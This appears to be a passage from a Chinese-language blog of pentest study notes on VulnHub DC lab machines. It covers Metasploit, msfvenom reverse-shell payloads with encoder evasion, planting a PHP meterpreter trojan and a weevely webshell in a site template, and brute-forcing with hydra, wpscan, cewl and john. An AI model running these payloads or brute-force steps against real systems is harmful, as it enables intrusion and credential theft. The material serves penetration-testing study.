<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110143969.png" alt="image-20220830110143969"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">再输入<span class="built_in">run</span>，运行脚本</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110303594.png" alt="image-20220830110303594"></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">shell</span>，进入<span class="built_in">shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110551273.png" alt="image-20220830110551273"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，查看当前的权限</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>发现是个低权限的账号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>，可以查看到当前的目录文件</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830110907408.png" alt="image-20220830110907408"></p>
<h3 id="（2）msf后门生成模块"><a href="#（2）msf后门生成模块" class="headerlink" title="（2）msf后门生成模块"></a>（2）msf后门生成模块</h3><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<h4 id="编码生成"><a href="#编码生成" class="headerlink" title="编码生成"></a>编码生成</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 <span class="attribute">lhost</span>=攻击机IP <span class="attribute">lport</span>=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<h4 id="以DC-3举个例子"><a href="#以DC-3举个例子" class="headerlink" title="*以DC-3举个例子"></a>*以DC-3举个例子</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kali的ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>注意，LHOST是kali的ip</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903222910397.png" alt="image-20220903222910397"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<p><img src="/2022/05/31/daily/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>然后在网站新建一个php文件</p>
<p><img src="/2022/05/31/daily/image-20220903221140645.png" alt="image-20220903221140645"></p>
<p>然后把木马内容导入进去</p>
<p><img src="/2022/05/31/daily/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p>然后保存一下</p>
<p><img src="/2022/05/31/daily/image-20220903221238918.png" alt="image-20220903221238918"></p>
<p>然后试试能不能访问木马</p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903221336853.png" alt="image-20220903221336853"></p>
<p>看到&#x2F;*，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用msf进行利用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">然后输入</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">进入我们利用msf制作的木马利用环境</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903220102252.png" alt="image-20220903220102252"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">看看需要填写什么</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>看到LHOST监听的ip没有填写</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>的<span class="comment">ip</span></span><br></pre></td></tr></table></figure>



<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">run</span>，运行，会卡住</span><br></pre></td></tr></table></figure>

<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903223414089.png" alt="image-20220903223414089"></p>
<p>后面操作不赘述</p>
<h4 id="msfvenom-—list-archs"><a href="#msfvenom-—list-archs" class="headerlink" title="msfvenom —list archs"></a>msfvenom —list archs</h4><p>#查看支持的系统架构</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure>

<h4 id="msfvenom-—list-platforms"><a href="#msfvenom-—list-platforms" class="headerlink" title="msfvenom —list platforms"></a>msfvenom —list platforms</h4><p>#查看支持系统平台</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">aix, <span class="keyword">android, </span>apple_ios, <span class="keyword">bsd, </span><span class="keyword">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class="keyword">java, </span><span class="keyword">javascript, </span><span class="keyword">juniper, </span>linux, mainframe, <span class="keyword">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br></pre></td></tr></table></figure>



<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload <span class="comment">#列出所有可用的payload</span></span><br><span class="line"></span><br><span class="line">msfvenom -l formats <span class="comment">#列出所有的输出格式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l <span class="built_in">encrypt</span> <span class="comment">#列出所有的加密方式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l encoders <span class="comment">#列出所有的编码器</span></span><br></pre></td></tr></table></figure>

<h4 id="常见生成格式"><a href="#常见生成格式" class="headerlink" title="常见生成格式"></a>常见生成格式</h4><h5 id="1、-Windows"><a href="#1、-Windows" class="headerlink" title="1、 Windows"></a>1、 Windows</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">i</span> <span class="number">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h5 id="2、Linux"><a href="#2、Linux" class="headerlink" title="2、Linux"></a>2、Linux</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class="selector-class">.elfxxxxxxxxxx</span> msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1</span><br></pre></td></tr></table></figure>

<h5 id="3、Mac"><a href="#3、Mac" class="headerlink" title="3、Mac"></a>3、Mac</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> osx -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class="selector-class">.macho</span></span><br></pre></td></tr></table></figure>

<h5 id="4、Android"><a href="#4、Android" class="headerlink" title="4、Android"></a>4、Android</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure>

<h5 id="5、Aspx"><a href="#5、Aspx" class="headerlink" title="5、Aspx"></a>5、Aspx</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom --platform windows-p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure>

<h5 id="6、JSP"><a href="#6、JSP" class="headerlink" title="6、JSP"></a>6、JSP</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> java -<span class="selector-tag">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class="selector-class">.jsp</span></span><br></pre></td></tr></table></figure>

<h5 id="7、PHP"><a href="#7、PHP" class="headerlink" title="7、PHP"></a>7、PHP</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br></pre></td></tr></table></figure>

<h5 id="8、BASH"><a href="#8、BASH" class="headerlink" title="8、BASH"></a>8、BASH</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd<span class="regexp">/unix/</span>reverse_bash -f raw -o shell.sh</span><br></pre></td></tr></table></figure>

<h5 id="9、Python"><a href="#9、Python" class="headerlink" title="9、Python"></a>9、Python</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>



<h4 id="Msfvenom常用命令参数"><a href="#Msfvenom常用命令参数" class="headerlink" title="Msfvenom常用命令参数"></a>Msfvenom常用命令参数</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># 列出--payload &lt;value&gt; 的标准，高级和规避选项</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># 指定 Payload 的输出格式(使用 --list formats 列出)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># 指定使用的 Encoder (使用 --list encoders 列出)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># 使用所有可用的编码器生成最小的payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 用于加密的密钥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 加密的初始化向量</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统架构(使用 --list archs 列出)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统平台 (使用 --list platforms 列出)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 保存payload文件</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># 设置需要在 Payload 中避免出现的字符，如： &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 指定 nop 在 payload 中的数量</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 设置未经编码的 Payload 的最大长度</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 编码后的 Payload 的最大长度</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># 设置 Payload 的编码次数</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定一个特定的可执行文件作为模板</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>



<h2 id="2）hydra"><a href="#2）hydra" class="headerlink" title="2）hydra"></a>2）hydra</h2><blockquote>
<p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p>
</blockquote>
<h3 id="1-爆破用户密码"><a href="#1-爆破用户密码" class="headerlink" title="1.爆破用户密码"></a>1.爆破用户密码</h3><p><strong>这里以vulnhub dc1为例</strong></p>
<p>用了<code>hydra</code>[海德拉]工具，对<code>flag4</code>用户进行爆破</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-p的文件是kali自带的密码包，当然也可以用其他的</span><br><span class="line"></span><br><span class="line">-s 端口</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830211817515.png" alt="image-20220830211817515"></p>
<h2 id="3）cewl"><a href="#3）cewl" class="headerlink" title="3）cewl"></a>3）cewl</h2><blockquote>
<p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>
<p><code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">-w等同于&gt;   <span class="regexp">//</span>写入</span><br><span class="line">-m n       <span class="regexp">//</span>至少生成的长度为n，默认是<span class="number">3</span></span><br><span class="line">-d x       <span class="regexp">//</span>生成更大的字典，默认x=<span class="number">2</span></span><br></pre></td></tr></table></figure>



<p>我们用<code>cewl</code>试试生成字典</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>目录下就会生成<code>pass.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> pass.txt，查看内容</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>发现是生成对应网站的密码字典</p>
<h2 id="4）wpscan"><a href="#4）wpscan" class="headerlink" title="4）wpscan"></a>4）wpscan</h2><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan -url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br><span class="line"></span><br><span class="line">-e u    <span class="regexp">//</span>枚举用户信息</span><br><span class="line"></span><br><span class="line">wpscan -url xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="regexp">//</span>密码字典路径，或者直接写</span><br><span class="line">-U userspath    <span class="regexp">//</span>用户名字典路径，或者直接写</span><br></pre></td></tr></table></figure>



<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>然后往下看用户名</p>
<p><img src="/2022/05/31/daily/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>稍微等一会</p>
<p><img src="/2022/05/31/daily/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>admin用户密码没有找到，应该是最高权限的账号</p>
<p>但是jerry和tom用户的密码知道了</p>
<h2 id="5）John"><a href="#5）John" class="headerlink" title="5）John"></a>5）John</h2><p>John是一个破解系统密码的工具</p>
<p>使用很简单</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john passwd<span class="selector-class">.txt</span> <span class="comment">//这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件</span></span><br><span class="line"></span><br><span class="line">john <span class="attr">--wordlist</span>=字典路径 passwd<span class="selector-class">.txt</span> <span class="comment">//这里是指定密码本，后面接的是需要爆破的密码文本文件</span></span><br></pre></td></tr></table></figure>



<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john <span class="attr">--show</span> passwd<span class="selector-class">.txt</span> <span class="comment">//这是查看该密码文本中已经被爆破成功过的密码</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>就可以看到明文为<code>snoopy</code></p>
<h2 id="6）weevely"><a href="#6）weevely" class="headerlink" title="6）weevely"></a>6）weevely</h2><blockquote>
<p>Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成Shell</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>

<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>成功进入shell</p>
<h2 id="7）whatweb"><a href="#7）whatweb" class="headerlink" title="7）whatweb"></a>7）whatweb</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">whatweb http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">220.156</span>/ &gt;&gt; whatweb.txt</span><br><span class="line"><span class="regexp">//</span>把网站的框架信息导入到文本whatweb.txt中</span><br></pre></td></tr></table></figure>

<p>这个工具主要是查看网站的框架，和<code>wapplzer</code>类似</p>
<p><img src="/2022/05/31/daily/image-20221103104233193.png" alt="image-20221103104233193"></p>
<h2 id="8）knockd"><a href="#8）knockd" class="headerlink" title="8）knockd"></a>8）knockd</h2><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>什么意思呢，也就是说，我先关闭了一个端口</p>
<p>但是呢，我为了我想要的人访问它，我写了一个<code>敲门的顺序（也就是访问端口的顺序）</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">顺序在<span class="regexp">/etc/</span>knockd.conf</span><br></pre></td></tr></table></figure>

<p>比如，</p>
<p>我关闭了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">22/ssh端口</span><br></pre></td></tr></table></figure>

<p>我写了一个顺序</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7893</span>,<span class="number">6452</span>,<span class="number">2412</span></span><br></pre></td></tr></table></figure>

<p>这是三个端口</p>
<p>我为什么为你<code>打开22端口</code>，原因是因为你<code>敲对了顺序</code></p>
<p>这里就涉及<code>敲门的方法</code></p>
<h3 id="1-gt-knock命令"><a href="#1-gt-knock命令" class="headerlink" title="1&gt; knock命令"></a>1&gt; knock命令</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.1.8</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span> //<span class="number">192.168.1.8</span>为目标ip</span><br></pre></td></tr></table></figure>

<h3 id="2-gt-nc命令"><a href="#2-gt-nc命令" class="headerlink" title="2&gt;nc命令"></a>2&gt;nc命令</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">$ nc -v dc9 <span class="number">7469</span></span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">7469</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">8475</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">8475</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">9842</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">9842</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">也就是利用nc命令三次访问这<span class="number">3</span>个端口</span><br></pre></td></tr></table></figure>

<p>最后用<code>nmap</code>扫一下就看见<code>22</code>端口打开了</p>
<h2 id="9-openssl"><a href="#9-openssl" class="headerlink" title="9)openssl"></a>9)openssl</h2><h3 id="SSL-简介"><a href="#SSL-简介" class="headerlink" title="SSL 简介"></a>SSL 简介</h3><blockquote>
<p>按照我的理解来解释下，</p>
<p>为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。</p>
<p>为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，</p>
<p> 现在几乎所有的银行网站访问都是基于HTTPS协议的。<br> 认证是通过证书+非对称加密算法来解决的</p>
</blockquote>
<blockquote>
<p>openssl可以实现：秘钥证书管理、对称加密和非对称加密。</p>
</blockquote>
<p>举一个例子</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">openssl passwd -<span class="number">1</span> -salt salt password</span><br><span class="line">==&gt;</span><br><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</span><br><span class="line"></span><br><span class="line">-salt salt用作盐的字符串。我选择字符串盐</span><br><span class="line"></span><br><span class="line">password我们想使用的明文密码</span><br></pre></td></tr></table></figure>

<h2 id="10-gobuster"><a href="#10-gobuster" class="headerlink" title="10)gobuster"></a>10)gobuster</h2><h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">gobuster</span> dir -w <span class="meta">common</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h3 id="爆破子域名"><a href="#爆破子域名" class="headerlink" title="爆破子域名"></a>爆破子域名</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gobuster</span> vhost -w subdomains-top1million-<span class="number">5000</span>.txt -u url</span><br></pre></td></tr></table></figure>



